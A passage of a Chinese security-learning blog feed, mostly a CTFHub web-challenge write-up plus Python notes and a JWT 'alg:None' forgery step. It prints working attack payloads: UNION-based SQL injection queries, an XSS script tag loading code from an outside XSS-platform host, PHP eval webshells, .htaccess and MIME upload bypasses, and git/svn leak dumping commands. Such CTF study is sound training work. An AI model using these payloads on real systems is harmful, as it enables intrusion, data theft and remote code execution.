{“login”:”admin”,”iat”:”1525342037”}.</p><p>然后分别对{“alg”:”None”,”typ”:”JWS”}</p><p>{“login”:”admin”,”iat”:”1525342037”}</p><p>进行base64加密，然后将bp抓到的token值替换为刚才加密的值</p><p>ok，已经变成admin用户。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
            <tag> json web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习</title>
      <link href="/2020/12/24/python-da-xue-xi/"/>
      <url>/2020/12/24/python-da-xue-xi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Python基础运算"><a href="#Python基础运算" class="headerlink" title="Python基础运算"></a>Python基础运算</h1><p>1.此处想要输出汉字需要在一开始加一个编码：#coding=utf-8</p><p>2.python最具有特色的就是用缩进来写模块</p><p>3.”””xxx”””这里可以多行print</p><p>4.通过#注释</p><p>5.</p><pre><code>counter = 100#赋值整数型变量miles = 1000.0#赋值浮点型变量name = &quot;iceberg404&quot;#赋值字符串</code></pre><p>6.python五个标准的数据类型：numbers（数字）、string（字符串）、list（列表）、tuple（元组）、dictionary（字典）</p><p>7.</p><pre><code>int 有符号整数型long 长整数（也可以代表八进制和十六进制）float 浮点数complex 复数int（x，[,base]）将x转换为一个整数long（x，[,base]）将x转换为一个长整数float（x，[,base]）将x转换为一个浮点数float（x） 将x转换到一个浮点数str（x） 将对象x转换为字符串tuple（s） 将序列s转换为元组list（s） 将序列s转换为一个列表abs（-10）结果为10#返回数字的绝对值max（x1，x2，x3）#返回给定参数的最大值，参数可以为序列sqrt（x）#返回数字x的平方例：import cmatha=9999999print abs（a）print max （1，2，3，4，5）b=8print cmath.sqrt（b）返回结果：99999995（2.82842712475+0j）&quot;&quot;&quot;当我们在日常生活中编写程序时，我们通常遇到需要使用数学来完成任务的情况。像其他编程语言一样，Python提供了各种基本运算操作，如*代表乘法，%代表求模运算，//代表整除。如果您正在编写一个程序来执行特定任务，如研究周期运动或模拟电路，您将需要使用三角函数以及复数。虽然您不能直接使用这些功能，但您可以先导入两个数学模块来访问它们。这两个模块是math和cmath。第一个模块允许您访问实数的双曲线，三角函数和对数函数，而后者允许您使用复数。&quot;&quot;&quot;</code></pre><p>c+=a等效于c=c+a</p><pre><code>a=20.00b=20if（a is b）  print &quot;a is b&quot;else (a == b)  print &quot;a==b&quot;输出结果为a==b这是is和==之间的区别，此处由于a是浮点数，所以a不等于整数b，故a不是是b，但是a=b。</code></pre><pre><code>flag = Falsename = &#39;ice&#39;if name == &#39;py&#39;:  flag = True  print &#39;1&#39;else:  print name</code></pre><pre><code>count = 0while(count &lt; 5):  print count,&quot;is less than 5&quot;  count += 1else:  print count,&quot;is not less than 5&quot;print &quot;over&quot;</code></pre><h1 id="Python正则："><a href="#Python正则：" class="headerlink" title="Python正则："></a>Python正则：</h1><p>正则表达式 Regular Expression, 正则表达式, ⼀种使⽤表达式的⽅式对字符串 进⾏匹配的语法规则. 我们抓取到的⽹⻚源代码本质上就是⼀个超⻓的字符串, 想从⾥⾯提 取内容.⽤正则再合适不过了. 正则的优点: 速度快, 效率⾼, 准确性⾼ 正则的缺点: 新⼿上⼿难度有 点⼉⾼. 不过只要掌握了正则编写的逻辑关系, 写出⼀个提取⻚⾯内容的正则 其实并不复杂 正则的语法: 使⽤元字符进⾏排列组合⽤来匹配字符串 在线测试正 则表达式<a href="https://tool.oschina.net/regex/" target="_blank" rel="noopener">https://tool.oschina.net/regex/</a> </p><p>元字符（默认只匹配一次）: 具有固定含义的特殊符号 常⽤元字符:</p><pre><code>. 匹配除换⾏符以外的任意字符\w 匹配字⺟或数字或下划线\s 匹配任意的空⽩符\d 匹配数字\n 匹配⼀个换⾏符\t 匹配⼀个制表符^ 匹配字符串的开始$ 匹配字符串的结尾\W 匹配⾮字⺟或数字或下划线\D 匹配⾮数字\S 匹配⾮空⽩符a|b 匹配字符a或字符b () 匹配括号内的表达式，也表示⼀个组[...] 匹配字符组中的字符 [^...] 匹配除了字符组中字符的所有字符</code></pre><p>量词: 控制前⾯的元字符出现的次数</p><pre><code>* 重复零次或更多次+ 重复⼀次或更多次? 重复零次或⼀次{n} 重复n次 {n,} 重复n次或更多次{n,m} 重复n到m次 .* 贪婪匹配.*? 惰性匹配</code></pre><h1 id="Python框架之Flask"><a href="#Python框架之Flask" class="headerlink" title="Python框架之Flask"></a>Python框架之Flask</h1><p>一晚上干会flask!</p><p>web框架-&gt;可以做网站</p><h1 id="Python函数"><a href="#Python函数" class="headerlink" title="Python函数"></a>Python函数</h1><h2 id="python中rb是什么意思-python中rb含义理解"><a href="#python中rb是什么意思-python中rb含义理解" class="headerlink" title="python中rb是什么意思_python中rb含义理解"></a>python中rb是什么意思_python中rb含义理解</h2><p>Python文件读写的几种模式：</p><p>r,rb,w,wb 那么在读写文件时，有无b标识的的主要区别在哪里呢？</p><p>文件使用方式标识</p><p>‘r’:默认值，表示从文件读取数据</p><p>‘w’:表示要向文件写入数据，并截断以前的内容</p><p>‘a’:表示要向文件写入数据，添加到当前内容尾部</p><p>‘r+’:表示对文件进行可读写操作(删除以前的所有数据)</p><p>‘r+a’：表示对文件可进行读写操作(添加到当前文件尾部)</p><p>‘b’:表示要读写二进制数据。</p><p>详细信息↓：</p><p><a href="https://blog.csdn.net/weixin_42116847/article/details/112924747" target="_blank" rel="noopener">python中rb是什么意思_python中rb含义理解</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CtfHub大学习</title>
      <link href="/2020/12/23/ctfhub-xue-xi/"/>
      <url>/2020/12/23/ctfhub-xue-xi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1464325108&auto=1&height=66"></iframe><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web前置技能"><a href="#Web前置技能" class="headerlink" title="Web前置技能"></a>Web前置技能</h2><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><h4 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h4><pre><code>题目：HTTP Method is GETUse CTF**B Method, I will give you flag.Hint: If you got 「HTTP Method Not Allowed」 Error, you should request index.php.</code></pre><p>意思就是你是get请求，你把这个请求换成CTFHUB就行</p><p>所以抓包直接一把梭</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51640_1.png" alt></p><h4 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h4><p>题目：</p><pre><code>No Flag here!Give me Flag</code></pre><p>点击发现没有跳转</p><p>二话不说，抓包一把梭了</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51653_2.png" alt></p><p>这里状态码变为了302说明进行了重定向</p><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>直接抓包，本来admin=0，然后给admin赋值=1就行了</p><h4 id="基础认证"><a href="#基础认证" class="headerlink" title="基础认证"></a>基础认证</h4><p>得到提示 do u konw admin ?，于是猜测账号是 admin , 那么接下来就只需要爆破密码了。注意看到 HTTP 请求头部的 Authorization 字段，后面的YWFhOmjiYg==用base64 解码后是 aaa:bbb，也就是我们之前输入的账号:密码。</p><p> 使用 BurpSuite 进行基础认证爆破</p><p>（1）将报文发送到 Intruder, 将 Basic后面 base64部分添加为payload position</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p><p>（2）在 Payloads选项卡下，选择 Payload Type为SimpleList,然后在 Payload Options 中点击 load 加载密码字典</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p><p>（3）Payload Processing -&gt; Add-&gt; Add Prefix（添加前缀）-&gt; 输入 admin:</p><p>  Payload Processing -&gt; Add-&gt; Encode（添加一个编码方式）-&gt; 选择 Base64 Encode</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p><p>（4）Payload Encode 取消勾选的 URL-encode, 不然你会看到base64之后的=会被转成 %3d ，你就算爆破到天荒地老也不会出来</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945375.png" alt="img"></p><p>（5）Start Attack ，然后按 Length 排序，并看到状态码出现200的，即爆破成功</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945389.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p><p>查看 Response，得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51753_3.png" alt></p><p>有点操作水平。。。。</p><h4 id="响应包源码"><a href="#响应包源码" class="headerlink" title="响应包源码"></a>响应包源码</h4><p>等游戏结束f12查看源码即可</p><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51433_1.png" alt></p><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p><a href="http://challenge-62869800fbc1a5d3.sandbox.ctfhub.com:10080/flag_in_here/3/4/flag.txt" target="_blank" rel="noopener">http://challenge-62869800fbc1a5d3.sandbox.ctfhub.com:10080/flag_in_here/3/4/flag.txt</a></p><h3 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h3><p><a href="http://challenge-8833e0a8156bbfbb.sandbox.ctfhub.com:10080/phpinfo.php" target="_blank" rel="noopener">http://challenge-8833e0a8156bbfbb.sandbox.ctfhub.com:10080/phpinfo.php</a></p><p>ctrl+f一把梭</p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//搜狗截图20年12月23日1437_2.png" style="zoom: 80%;"><p>ctfhub{eff7ead587e67aab8af40775}</p><h3 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h3><h4 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h4><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p><p>可能有点用的提示：</p><pre><code>#### 常见的网站源码备份文件后缀------- tar- tar.gz- zip- rar#### 常见的网站源码备份文件名------- web- website- backup- back- www- wwwroot- temp</code></pre><p><a href="http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/www.zip" target="_blank" rel="noopener">http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/www.zip</a></p><pre><code>\#!usr/bin/env python#_*_ coding:utf-8 _*_import requests url=&quot;http://challenge-9936840b90db7048.sandbox.ctfhub.com:10080/&quot;list1=[&#39;web&#39;, &#39;website&#39;, &#39;backup&#39;, &#39;back&#39;, &#39;www&#39;, &#39;wwwroot&#39;, &#39;temp&#39;] list2=[&#39;tar&#39;, &#39;tar.gz&#39;, &#39;zip&#39;, &#39;rar&#39;]for i in list1:  for j in list2:         url_f=url+i+&quot;.&quot;+j    r=requests.get(url_f)        if(r.status_code == 200):            print(url_f)</code></pre><p>对没有错，就是通过这个脚本来判断是哪个页面为200</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51522_4.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51452_3.png" alt></p><p><a href="http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/flag_33916625.txt" target="_blank" rel="noopener">http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/flag_33916625.txt</a></p><p>完事！</p><h4 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h4><p>介绍：当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p><p>针对index.php.bak文件</p><p>输入下载完以后改为.txt格式打开直接一把梭</p><h4 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h4><p>介绍：当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p><p>.index.php.swp</p><p>这里注意index前面有个点</p><p>然后将swp改为txt打开</p><h4 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h4><p>介绍：.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p><p>下载完以后用.md文件格式打开</p><p>18c26ec34f6edafc85a7cd5e20853f58.txt发现这个文件</p><p><a href="http://challenge-f8108aa66ac9b7ac.sandbox.ctfhub.com:10080/18c26ec34f6edafc85a7cd5e20853f58.txt一把梭" target="_blank" rel="noopener">http://challenge-f8108aa66ac9b7ac.sandbox.ctfhub.com:10080/18c26ec34f6edafc85a7cd5e20853f58.txt一把梭</a></p><h3 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h3><h4 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h4><p>介绍：当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p><p>先用dirsearch.py进行扫描</p><p>python3 dirsearch.py -u <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a> -e*</p><pre><code>-u 指定网址 -e 指定网站语言#例如-e php，zip，这里-e*是所有 -t 指定线程 -w 指定字典 -r 递归目录（跑出目录后，继续跑目录下面的目录） --random-agents 使用随机UA(默认在db/uesr-agents.txt中，可以自己添加) -x 排除指定状态码 -s 置请求之间的延时(秒)</code></pre><p>然后用githack脚本跑</p><pre><code>python GitHack.py http://challenge-bf6c3305d834ed77.sandbox.ctfhub.com:10080/.git</code></pre><p>跑完以后去list目录去看看</p><p>进入所下载的文件里面</p><pre><code>git log#使用git log命令查看本地的所有提交</code></pre><p>得：<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51914_4.png" alt></p><pre><code>git reset --hard ea27539d5ad2aa769ee2375400a0a5afc39faab0#彻底回退到某个版本，本地的源码也会变为上一个版本的内容，撤销的commit中所包含的更改被冲掉；lscat 241282368416724.txt</code></pre><p>得到flag</p><h4 id="stash（储藏）"><a href="#stash（储藏）" class="headerlink" title="stash（储藏）"></a>stash（储藏）</h4><p>理解：</p><p>当你要修改或者变更文件的时候，可以通过这个git statsh命令将其暂时保存到一个堆栈中，就好像是写到一半的文件突然不写了，你要去写另一个文件，这样为了避免这个文件消失，你就要用这个命令将他进行一下储存，然后办完手头的事情后，你就可以继续通过存到栈里面的文件继续进行之前未完成的编辑，而这个题目，就是针对查找通过stash命令存到栈里面的文件</p><p>和上一题一样</p><pre><code>git log//查看历史记录git stash poplscat 13456789.txt说明：$git stash                 ／／把本地修改并且未提交的内容，存储到本地栈中的栈顶。$do some work        ／／此时你可以去切换分支或者pull最新代码$git stash pop          ／／此时你可以把你刚才stash到本地栈中的代码pop到本地</code></pre><h4 id="index"><a href="#index" class="headerlink" title="index"></a>index</h4><p>启动githack</p><pre><code>python GitHack.py http://challenge-3aa10bcada98b68b.sandbox.ctfhub.com:10080/.git</code></pre><p>将他的git文件clone到本地然后查看就直接一把</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8811%E6%97%A51208_1.png" alt></p><h3 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h3><p>引子：</p><p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p><h4 id="去网上了解一下svn漏洞："><a href="#去网上了解一下svn漏洞：" class="headerlink" title="去网上了解一下svn漏洞："></a>去网上了解一下svn漏洞：</h4><h5 id="什么是SVN"><a href="#什么是SVN" class="headerlink" title="什么是SVN?"></a>什么是SVN?</h5><p>SVN是subversion的缩写，是一个开放源代码的版本控制系统，通过采用分支管理系统的高效管理，简而言之就是用于多个人共同开发同一个项目，实现共享资源，实现最终集中式的管理。</p><h5 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h5><p>在服务器上布署代码时。如果是使用 svn checkout 功能来更新代码，而没有配置好目录访问权限，则会存在此漏洞。黑客利用此漏洞，可以下载整套网站的源代码。<br>在使用SVN管理本地代码过程中，会自动生成一个隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使隐藏文件夹被暴露于外网环境，这使得渗透工程师可以借助其中包含版本信息追踪的网站文件，逐步摸清站点结构。</p><p>用到的工具：dvcs-ripper</p><p>用dirsearch跑了一下.svn发现确实有，可能方法不对，跑都跑不完</p><p>然后开始回归正常操作：</p><p>1.下载所需要的工具：</p><pre><code>git clone https://github.com/kost/dvcs-ripper /svn</code></pre><p>我这里是将它下载到svn目录里面</p><p>2.使用</p><pre><code>perl rip-svn.pl -u http://challenge-30d239a5f2b26f23.sandbox.ctfhub.com:10080/.svn/</code></pre><p>补充：需要注意的是，.svn是隐藏文件，在linux下必须ls -al才能看到。<br>3.根据题目的提示，Flag 在服务端旧版本的源代码中。<br>注意那个tree中的pristine，里面一般存储的是代码的历史版本。我们直接进入目录，然后读取文件就可以得到flag了</p><p>问题：该软件不能正常使用，需要配置组件（暂未解决）</p><h2 id="密码口令"><a href="#密码口令" class="headerlink" title="密码口令"></a>密码口令</h2><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>我的密码是admin123</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8811%E6%97%A51352_2.png" alt></p><h3 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h3><p>这个题看很特别，看别人wp上说：是通过网上搜索eyou的默认口令来进入网站</p><p><a href="https://blog.csdn.net/weixin_45785288/article/details/108274723" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45785288/article/details/108274723</a></p><p>考查的信息收集能力</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h3><h4 id="1-检测注入点"><a href="#1-检测注入点" class="headerlink" title="1.检测注入点"></a>1.检测注入点</h4><p>输入1得到Data: ctfhub输入2得到Data：skill输入3没有回显，输入1 or 1=1也会显示1的内容这是直接显示出来了？</p><h4 id="2-构造注入语句"><a href="#2-构造注入语句" class="headerlink" title="2.构造注入语句"></a>2.构造注入语句</h4><h5 id="a-得到数据库"><a href="#a-得到数据库" class="headerlink" title="a.得到数据库"></a>a.得到数据库</h5><p>-1 union select 1,2</p><p>得到回显Data: 2</p><p>-1 union select 1,3</p><p>得到回显Data: 3</p><p>-1 union select 1,database()</p><p>回显Data: sqli（得到数据库）</p><h5 id="b-得到数据库里面的表"><a href="#b-得到数据库里面的表" class="headerlink" title="b.得到数据库里面的表"></a>b.得到数据库里面的表</h5><p>-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=”sqli”</p><p>得到回显：</p><p>Data: news,flag</p><h5 id="c-爆列名"><a href="#c-爆列名" class="headerlink" title="c.爆列名"></a>c.爆列名</h5><p>-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=”flag”</p><p>得到回显：</p><p>Data: flag</p><h5 id="d-爆字段"><a href="#d-爆字段" class="headerlink" title="d.爆字段"></a>d.爆字段</h5><p>-1 union select 1,group_concat(flag) from flag</p><p>得到回显：</p><p>Data: ctfhub{3040c5c414ba645535376218}</p><h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>就像整数型一样，但是区别于有单引号需要自己构造单引号语句来让其失效</p><h4 id="1-查看数据库的列数"><a href="#1-查看数据库的列数" class="headerlink" title="1.查看数据库的列数"></a>1.查看数据库的列数</h4><p>1’ order by 3 – ‘发现报错，那么改为2 ：1’ order by 2 – ‘得到回显</p><p>说明有两列</p><h4 id="2-联合查询"><a href="#2-联合查询" class="headerlink" title="2.联合查询"></a>2.联合查询</h4><h5 id="a-爆库名"><a href="#a-爆库名" class="headerlink" title="a.爆库名"></a>a.爆库名</h5><p>这是获取所有数据库的语句：</p><p>‘ union select 1,group_concat(schema_name) from information_schema.schemata – ‘</p><p>发现information_schema是一个数据库</p><p>‘ union select 1,database()#</p><p>得到了sqli</p><h5 id="b-爆表"><a href="#b-爆表" class="headerlink" title="b.爆表"></a>b.爆表</h5><p>‘ union select table_schema, group_concat(table_name) from information_schema.tables where table_schema=’sqli’ – ‘</p><h5 id="c-爆列名-1"><a href="#c-爆列名-1" class="headerlink" title="c.爆列名"></a>c.爆列名</h5><p>-1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’flag’#</p><h5 id="d-爆字段-1"><a href="#d-爆字段-1" class="headerlink" title="d.爆字段"></a>d.爆字段</h5><p>‘ union select 1,group_concat(flag) from flag – ‘</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>利用xss platform平台创建一个xss反射型的脚本</p><pre><code>&lt;/tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC=//xs.sb/wnbP&gt;&lt;/sCrIpT&gt;</code></pre><p>没什么好记的操作很简单直接上大佬的wp</p><p><a href="https://blog.csdn.net/weixin_43486981/article/details/107974878" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43486981/article/details/107974878</a></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h3><p>一句话，一把梭</p><pre><code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8811%E6%97%A52238_4.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8811%E6%97%A52238_5.png" alt></p><h3 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h3><p>与无验证的区别在于对于上传的文件格式的后缀有规定</p><p>所以：shell.php.png 安排只要保证能传上去就行了，同时抓包去掉.png保证蚁剑可以识别</p><p>然后重复一句话，一把梭操作即可</p><h4 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h4><p>介绍：</p><p>.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。</p><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>简单来说，就是我上传了一个.htaccess文件到服务器，那么服务器之后就会将特定格式的文件以php格式解析。</p><p>理解：</p><p>看到这，明白了，就好比你即使上传的是png文件，但是通过htaccess文件的解析，你依然是php文件</p><p>大佬的代码：</p><p>//方法一 SetHandler application/x-httpd-php      //所有的文件当做php文件来解析 </p><p>//方法二 AddType application/x-httpd-php .png    //.png文件当作php文件解析</p><p>上传顺序：</p><p>先制作.htaccess再来shell.png（毕竟进行了前端验证）</p><p>1.AddType application/x-httpd-php .png</p><p>2.<?php @eval($_POST['666']);?>一句话，一把梭</p><h4 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h4><p>引子：</p><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。</p><p>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p><p>浏览器通常使用MIME类型（而不是文件扩展名）来确定如何处理URL，因此Web服务器在响应头中添加正确的MIME类型非常重要。如果配置不正确，浏览器可能会曲解文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。</p><p>通过介绍可以看出来，这种类型的过滤不是针对文件后缀名，而是根据http响应头信息，所以一定要通过抓包进行分析：</p><p>如果直接传的话会出现下面结果：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51052_1.png" alt></p><p>但是如果将：</p><p>Content-Type: application/octet-stream</p><p>改为：</p><p>Content-Type: image/png</p><p>就会显示上传成功</p><p>然后一句话，一把梭</p><h5 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h5><p>引子:</p><p><strong>%00截断的两个条件</strong></p><ul><li>php &lt; 5.3.4</li><li>magic_quotes_gpc = off</li></ul><p>木马的文件格式为：phpwebshell.php%00.jpg</p><p>但是这个题需要截断的地方不是从文件的后缀进行截断，而是在响应后信息进行修改</p><p><strong>分析源码：</strong></p><pre><code>if (!empty($_POST[&#39;submit&#39;])) {    $name = basename($_FILES[&#39;file&#39;][&#39;name&#39;]);    $info = pathinfo($name);    $ext = $info[&#39;extension&#39;];    $whitelist = array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);    if (in_array($ext, 